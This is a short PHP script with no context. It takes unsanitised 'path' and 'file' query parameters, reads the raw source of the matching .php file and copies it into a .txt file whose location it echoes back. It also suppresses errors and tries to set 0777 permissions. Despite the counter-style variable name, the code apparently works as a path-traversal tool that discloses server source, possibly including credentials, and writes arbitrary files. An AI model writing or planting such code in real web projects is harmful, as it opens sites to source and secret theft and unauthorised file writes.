<?php

$path="";
$file="";


if (isset($_GET["path"]))
{
	$path=$_GET["path"];
}

if (isset($_GET["file"]))
{
	$file=$_GET["file"];
}




$filename="./".$path."/".$file.".php";
$filename1="./".$path."/".$file.".txt";
$hit_count="No file exists!!";


if (file_exists($filename)) {
    $hit_count = @file_get_contents($filename);
} else {
    @file_put_contents($filename1, $hit_count);
	@chmod($filename, 0777);
}


@file_put_contents($filename1, $hit_count);

echo $filename1;

//header("Location: "."./".$path."/".$file.".".$ext);

?>